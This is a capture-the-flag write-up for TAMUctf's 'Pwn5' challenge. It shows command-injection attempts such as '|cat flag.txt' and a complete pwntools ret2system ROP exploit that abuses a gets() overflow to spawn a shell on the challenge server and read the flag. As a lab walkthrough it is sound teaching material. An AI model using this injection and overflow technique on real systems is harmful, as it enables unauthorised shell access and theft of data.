# Pwn5
Pwn, 372 points

## Description:

A binary file was attached, in addition to an address and port.

## Solution:

Let's run the binary:

```console
root@kali:/media/sf_CTFs/tamu/Pwn5# nc pwn.tamuctf.com 4325
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
-al
Result of ls -al:
total 728
drwxr-xr-x 1 root    root      4096 Feb 19 20:47 .
drwxr-xr-x 1 root    root      4096 Mar 14 21:45 ..
-r--r--r-- 1 pwnflag pwnflag     32 Feb 19 20:46 flag.txt
-rwsr-xr-x 1 pwnflag pwnflag 730072 Feb 19 20:46 pwn5
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
|cat flag.txt
Result of ls |ca:
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
-alt
Result of ls -al:
total 728
drwxr-xr-x 1 root    root      4096 Feb 19 20:47 .
drwxr-xr-x 1 root    root      4096 Mar 14 21:45 ..
-r--r--r-- 1 pwnflag pwnflag     32 Feb 19 20:46 flag.txt
-rwsr-xr-x 1 pwnflag pwnflag 730072 Feb 19 20:46 pwn5
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
```

This challenge looks like the previous one ([Pwn4](Pwn4.md)) but this time cuts our input after three characters. For example, if we enter `-alt` as the parameter, only `-al` is executed.

At first I tried piping to a two-letter command:

```
root@kali:/media/sf_CTFs/tamu/Pwn5# ls /bin/?? /usr/bin/?? /sbin/??
/bin/cp  /bin/ip  /bin/mt  /bin/ps  /bin/ss   /sbin/iw     /usr/bin/ar  /usr/bin/bc  /usr/bin/ex  /usr/bin/hd  /usr/bin/ld  /usr/bin/nm  /usr/bin/r2  /usr/bin/tr  /usr/bin/vi
/bin/dd  /bin/ln  /bin/mv  /bin/rm  /bin/su   /sbin/tc     /usr/bin/as  /usr/bin/cc  /usr/bin/gc  /usr/bin/id  /usr/bin/m4  /usr/bin/od  /usr/bin/ri  /usr/bin/ts  /usr/bin/wc
/bin/df  /bin/ls  /bin/nc  /bin/sh  /sbin/ip  /usr/bin/7z  /usr/bin/b2  /usr/bin/du  /usr/bin/gs  /usr/bin/js  /usr/bin/nl  /usr/bin/pr  /usr/bin/sg  /usr/bin/ul  /usr/bin/xz
root@kali:/media/sf_CTFs/tamu/Pwn5# nc pwn.tamuctf.com 4325
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
|su
Result of ls |su:
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
|sh
Result of ls |sh:
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
|wc
Result of ls |wc:
      2       2      14
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
```

I hoped that `sh` would work, but it unfortunately didn't.

Trying `vi` gave an interesting output but seemed to exit immediately:
```console
root@kali:/media/sf_CTFs/tamu/Pwn5# nc pwn.tamuctf.com 4325
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
|vi
Result of ls |vi:

~
~
~                              VIM - Vi IMproved
~
~                               version 7.4.1689
~                           by Bram Moolenaar et al.
~           Modified by pkg-vim-maintainers@lists.alioth.debian.org
~                 Vim is open source and freely distributable
~
~                        Help poor children in Uganda!
~                type  :help iccf<Enter>       for information
~
~                type  :q<Enter>               to exit
~                type  :help<Enter>  or  <F1>  for on-line help
~                type  :help version7<Enter>   for version info
~
~                        Running in Vi compatible mode
~                type  :set nocp<Enter>        for Vim defaults
~                type  :help cp-default<Enter> for info on this
~
~
~
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
```

At last, I opened the binary in a disassembler.

One thing that was immediately obvious from the function list was that this ELF was statically linked. This can be also seen using the following indications:

```console
root@kali:/media/sf_CTFs/tamu/Pwn5# ldd pwn5
        not a dynamic executable
root@kali:/media/sf_CTFs/tamu/Pwn5# file pwn5
pwn5: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=f9690a5a90e54f8336b65636e719feac16798d50, not stripped
```

Let's check the decompilation using ghidra:
```c
void laas(void)
{
  int res;
  char usr_cmd [13];
  
  puts("ls as a service (laas)(Copyright pending)");
  puts("Version 2: Less secret strings and more portable!");
  puts("Enter the arguments you would like to pass to ls:");
  gets(usr_cmd);
  res = (int)strchr(usr_cmd,'/');
  if (res == 0) {
    run_cmd(usr_cmd);
  }
  else {
    puts("No slashes allowed");
  }
  return;
}

void run_cmd(undefined4 user_cmd)
{
  char cmd_buf [18];
  
  snprintf(cmd_buf,7,"ls %s",user_cmd);
  printf("Result of %s:\n",cmd_buf);
  system(cmd_buf);
  return;
}
```

The `snprintf` docs say:

> Composes a string with the same text that would be printed if format was used on printf, but instead of being printed, the content is stored as a C string in the buffer pointed by s (taking n as the maximum buffer capacity to fill).
> 
> If the resulting string would be longer than n-1 characters, the remaining characters are discarded and not stored, but counted for the value returned by the function.
> 
> A terminating null character is automatically appended after the content written.

So since `n = 7` and `len("ls ") = 3`, this leaves 3 characters apart from the null terminator, like we saw earlier - not much to work with.

The `gets` call to populate `usr_cmd` on the other hand seems much more promising - we can use it to overflow the buffer and override the return address of the function.

We know that the program calls `system`, and that it's statically linked into the ELF, so all we need for a successful ROP attack is to find some parameter to send to `system`.

Luckily, somewhere inside the binary we have exactly what we need:
```console
root@kali:/media/sf_CTFs/tamu/Pwn5# strings pwn5 | grep /bin/sh
/bin/sh
```

Let's put it all together with `pwntools`:

```python
import os
from pwn import *

LOCAL_PATH = "./pwn5"
REMOTE_PATH = ("pwn.tamuctf.com", 4325)

def get_process(is_remote):
    if is_remote:
        p = remote(*REMOTE_PATH)
    else:
        p = process(LOCAL_PATH)
    
    return p

def send_payload(proc, payload):
    proc.sendlineafter("Enter the arguments you would like to pass to ls:", payload)

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm ./core.*")

    payload = cyclic(320)
    proc = get_process(is_remote = False)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.eip)
    return offset

e = ELF(LOCAL_PATH)
context.binary = e.path

overflow_offset = get_overflow_offset()
log.info("overflow offset: {}".format(overflow_offset))

system_addr = e.symbols["system"]
log.info("system() address: {}".format(hex(system_addr)))

binsh_addr = next(e.search('/bin/sh\x00'))
log.info("/bin/sh address: {}".format(hex(binsh_addr)))

rop = ROP(context.binary)
rop.system(binsh_addr)

print rop.dump()

p = get_process(args.REMOTE)
payload = fit({overflow_offset: str(rop)}, filler = 'A')
log.info("Sending payload: {}".format(enhex(payload)))
p.sendline(payload)
p.interactive()
```

Output:

```console
root@kali:/media/sf_CTFs/tamu/Pwn5# python exploit.py REMOTE
[*] '/media/sf_CTFs/tamu/Pwn5/pwn5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './pwn5': pid 3979
[*] Process './pwn5' stopped with exit code -11 (SIGSEGV) (pid 3979)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/tamu/Pwn5/core.3979'
    Arch:      i386-32-little
    EIP:       0x66616161
    ESP:       0xffb33cd0
    Exe:       '/media/sf_CTFs/tamu/Pwn5/pwn5' (0x8048000)
    Fault:     0x66616161
[*] overflow offset: 17
[*] system() address: 0x804ee30
[*] /bin/sh address: 0x80bc140
[*] Loaded cached gadgets for '/media/sf_CTFs/tamu/Pwn5/pwn5'
0x0000:        0x804ee30 system(0x80bc140)
0x0004:           'baaa' <return address>
0x0008:        0x80bc140 arg0
[+] Opening connection to pwn.tamuctf.com on port 4325: Done
[*] Sending payload: 414141414141414141414141414141414130ee04086261616140c10b08
[*] Switching to interactive mode
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
Result of ls AAA:
$ ls
flag.txt
pwn5
$ cat flag.txt
gigem{r37urn_0r13n73d_pr4c71c3}
$ exit
$
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to pwn.tamuctf.com port 4325
[*] Got EOF while sending in interactive
```

